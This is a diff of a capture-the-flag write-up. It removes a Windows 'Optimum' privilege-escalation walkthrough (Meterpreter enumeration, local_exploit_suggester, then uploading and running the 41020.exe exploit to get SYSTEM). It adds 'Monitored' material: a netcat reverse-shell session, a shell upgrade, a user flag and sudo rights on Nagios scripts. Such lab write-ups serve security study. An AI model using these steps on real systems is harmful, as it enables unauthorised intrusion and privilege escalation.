+bash: cannot set terminal process group (13481): Inappropriate ioctl for device
+bash: no job control in this shell
+# upgrade shell
+nagios@monitored:/tmp$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+nagios@monitored:/tmp$ ^Z
+[1]+  Stopped                 sudo nc -lvnp 1337
+
+┌──(kali㉿CSpanias)-[~/htb/fullpwn/monitored]
+└─$ stty raw -echo; fg
+sudo nc -lvnp 1337
+
+nagios@monitored:/tmp$ export TERM=xterm
+nagios@monitored:/tmp$ id
+id
+uid=1001(nagios) gid=1001(nagios) groups=1001(nagios),1002(nagcmd)
+nagios@monitored:/tmp$ cd ~
+cd ~
+nagios@monitored:/home/nagios$ ls
+ls
+cookie.txt  user.txt
+nagios@monitored:/home/nagios$ cat user.txt
+cat user.txt
+fdf35f5741dd156e34bf10738ced40c4
 ```
 
 ## Privilege escalation
 
-Let's perform some basic enumeration:
-
 ```bash
-meterpreter > getuid
-Server username: OPTIMUM\kostas
-meterpreter > sysinfo
-Computer        : OPTIMUM
-OS              : Windows Server 2012 R2 (6.3 Build 9600).
-Architecture    : x64
-System Language : el_GR
-Domain          : HTB
-Logged On Users : 2
-Meterpreter     : x86/windows
+nagios@monitored:/tmp$ sudo -l
+sudo -l
+Matching Defaults entries for nagios on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User nagios may run the following commands on localhost:
+    (root) NOPASSWD: /etc/init.d/nagios start
+    (root) NOPASSWD: /etc/init.d/nagios stop
+    (root) NOPASSWD: /etc/init.d/nagios restart
+    (root) NOPASSWD: /etc/init.d/nagios reload
+    (root) NOPASSWD: /etc/init.d/nagios status
+    (root) NOPASSWD: /etc/init.d/nagios checkconfig
+    (root) NOPASSWD: /etc/init.d/npcd start
+    (root) NOPASSWD: /etc/init.d/npcd stop
+    (root) NOPASSWD: /etc/init.d/npcd restart
+    (root) NOPASSWD: /etc/init.d/npcd reload
+    (root) NOPASSWD: /etc/init.d/npcd status
+    (root) NOPASSWD: /usr/bin/php
+        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
+    (root) NOPASSWD: /usr/bin/php
+        /usr/local/nagiosxi/scripts/migrate/migrate.php *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
+nagios@monitored:/tmp$
 ```
 
-If a process is running with an account that has higher privileges than ours, e.g. `SYSTEM`, we can migrate to it and easily perform our privilege escalation. Let's check which processes are running and under what permissions:
-
-```bash
-meterpreter > ps
-
-Process List
-============
-
- PID   PPID  Name                  Arch  Session  User            Path
- ---   ----  ----                  ----  -------  ----            ----
- 0     0     [System Process]
- 4     0     System
- 228   4     smss.exe
- 336   324   csrss.exe
- 388   324   wininit.exe
- 396   380   csrss.exe
- 428   380   winlogon.exe
- 476   480   VGAuthService.exe
- 480   388   services.exe
- 488   388   lsass.exe
- 532   480   spoolsv.exe
- 548   480   svchost.exe
- 576   480   svchost.exe
- 664   1960  explorer.exe          x64   1        OPTIMUM\kostas  C:\Windows\explorer.exe
- 668   428   dwm.exe
- 676   480   svchost.exe
- 704   480   svchost.exe
- 764   480   svchost.exe
- 832   480   svchost.exe
- 844   480   svchost.exe
- 964   480   svchost.exe
- 1036  480   vmtoolsd.exe
- 1052  480   ManagementAgentHost.
-             exe
- 1196  704   taskhostex.exe        x64   1        OPTIMUM\kostas  C:\Windows\System32\taskhostex.exe
- 1220  480   svchost.exe
- 1360  548   WmiPrvSE.exe
- 1444  480   dllhost.exe
- 1580  548   WmiPrvSE.exe
- 1672  480   msdtc.exe
- 1828  2044  JuenwUyEDfVKX.exe     x86   1        OPTIMUM\kostas  C:\Users\kostas\AppData\Local\Temp\rad574C1.tmp\JuenwUyE
-                                                                  DfVKX.exe
- 1876  2352  conhost.exe           x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
- 2044  2416  wscript.exe           x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\wscript.exe
- 2352  1828  cmd.exe               x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\cmd.exe
- 2388  664   vmtoolsd.exe          x64   1        OPTIMUM\kostas  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
- 2416  664   hfs.exe               x86   1        OPTIMUM\kostas  C:\Users\kostas\Desktop\hfs.exe
-```
-
-Unfortunately, nothing interesting there. We can use the `local_exploit_suggester` module by attaching it to the currently active `meterpreter` session. This module will try to find potential exploits to escalate our privileges based on the `sysinfo` output from our current active session:
-
-```bash
-# background the active session
-meterpreter > bg
-[*] Backgrounding session 1...
-# search for desired module
-msf6 exploit(windows/http/rejetto_hfs_exec) > search local_exploit_suggester
-
-Matching Modules
-================
-
-   #  Name                                      Disclosure Date  Rank    Check  Description
-   -  ----                                      ---------------  ----    -----  -----------
-   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
 
 
-Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+> [Automated script](https://gist.github.com/Acters/058b0421dba28860afd5559db6a7afee)
 
-# select the desired module
-msf6 exploit(windows/http/rejetto_hfs_exec) > use 0
-# check available options
-msf6 post(multi/recon/local_exploit_suggester) > show options
-
-Module options (post/multi/recon/local_exploit_suggester):
-
-   Name             Current Setting  Required  Description
-   ----             ---------------  --------  -----------
-   SESSION                           yes       The session to run this module on
-   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
-
-
-View the full module info with the info, or info -d command.
-# attach module to the active session
-msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
-SESSION => 1
-```
-
-We are ready to run the `local_exploit_suggester` module:
-
-```bash
-msf6 post(multi/recon/local_exploit_suggester) > run
-
-[*] 10.10.10.8 - Collecting local exploits for x86/windows...
-[*] 10.10.10.8 - 190 exploit checks are being tried...
-[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
-[+] 10.10.10.8 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
-[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
-[+] 10.10.10.8 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
-[*] Running check method for exploit 41 / 41
-[*] 10.10.10.8 - Valid modules for session 1:
-============================
-
-<SNIP>
-
-[*] Post module execution completed
-```
-
-It is a good practice to scan for both `x64` and `x86` processes, as some exploits can run only in one out of the two architectures. We can use `meterpreter` to migrate onto an `x64` process and run the `local_exploit_suggester` module again:
-
-```bash
-msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1
-[*] Starting interaction with 1...
-
-meterpreter > ps
-
-Process List
-============
-
- PID   PPID  Name                     Arch  Session  User            Path
- ---   ----  ----                     ----  -------  ----            ----
-<SNIP>
-
-664   1960  explorer.exe             x64   1        OPTIMUM\kostas  C:\Windows\explorer.exe
-
-<SNIP>
-
-meterpreter > migrate 664
-[*] Migrating from 1828 to 664...
-[*] Migration completed successfully.
-
-meterpreter > sysinfo
-Computer        : OPTIMUM
-OS              : Windows Server 2012 R2 (6.3 Build 9600).
-Architecture    : x64
-System Language : el_GR
-Domain          : HTB
-Logged On Users : 2
-Meterpreter     : x64/windows
-```
-
-We now have a `x64/windows` Meterpreter shell and we can check local exploits again:
-
-```bash
-meterpreter > bg
-[*] Backgrounding session 1.
-
-msf6 post(multi/recon/local_exploit_suggester) > run
-
-[*] 10.10.10.8 - Collecting local exploits for x64/windows...
-[*] 10.10.10.8 - 190 exploit checks are being tried...
-[+] 10.10.10.8 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
-[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
-[+] 10.10.10.8 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
-[+] 10.10.10.8 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
-[+] 10.10.10.8 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
-[+] 10.10.10.8 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 8.1/Windows Server 2012 R2 build detected!
-[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
-[+] 10.10.10.8 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
-[*] Running check method for exploit 45 / 45
-[*] 10.10.10.8 - Valid modules for session 1:
-============================
-
-<SNIP>
-```
-
-If there is an exploit that is suggested for both `x64` and `x86`, then we should try it first. In this case, this is the `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`. After trying almost every configuration possible, restarting the machine multiple times, etc. this module does not seem to work, althought it is the intended avenue for privilege escalation.
-
-This box was created ~7 years back, so a lot have changed since then and those things are expected. Fortunately for us, there is an [executable](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/blob/main/bin-sploits/41020.exe) stored in Exploit-DB's GitLab, which we can download on our attack host, transfer to the target, and then execute it. This will successfully escalate our privileges to `NT AUTHORITY\SYSTEM` and we would be able to grab the `root` flag:
-
-```bash
-# upload the executable to target
-meterpreter > upload ~/Downloads/41020.exe -o "c:\users\kostas\desktop"
-[*] Uploading  : /home/kali/Downloads/41020.exe -> c:\users\kostas\desktop\41020.exe
-[*] Completed  : /home/kali/Downloads/41020.exe -> c:\users\kostas\desktop\41020.exe
-# execute the file
-C:\Users\kostas\Desktop>41020.exe
-41020.exe
-Microsoft Windows [Version 6.3.9600]
-(c) 2013 Microsoft Corporation. All rights reserved.
-# check account privileges
-C:\Users\kostas\Desktop>whoami
-whoami
-nt authority\system
-# read the root flag
-C:\Users\kostas\Desktop>type c:\users\administrator\desktop\root.txt
-type c:\users\administrator\desktop\root.txt
-<SNIP>
-```
-
-![](machine_pwned.png){: width="75%" .normal}
+![](machine_pwned.png){: width="75%" .normal} -->
